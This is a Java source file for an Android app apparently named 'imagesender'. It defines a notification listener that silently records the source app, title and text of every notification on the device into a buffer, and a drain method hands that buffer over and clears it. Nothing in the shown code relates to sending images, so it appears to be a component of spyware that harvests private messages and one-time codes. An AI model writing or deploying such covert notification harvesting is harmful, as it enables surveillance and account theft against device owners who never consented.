package com.dotbhai.imagesender;

import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;

public class NotifListener extends NotificationListenerService {

    public static StringBuilder buffer = new StringBuilder();

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        try {
            String pkg = sbn.getPackageName();
            android.os.Bundle ex = sbn.getNotification().extras;
            String title = ex.getString("android.title", "");
            String text  = ex.getString("android.text", "");

            buffer.append("🔔 [").append(pkg).append("]\n")
                  .append(title).append(": ").append(text).append("\n\n");

            if (buffer.length() > 4000)
                buffer.delete(0, buffer.length() - 4000);
        } catch (Exception ignored) {}
    }

    public static String drain() {
        String s = buffer.length() == 0 ? "لا إشعارات" : buffer.toString();
        buffer.setLength(0);
        return s;
    }
}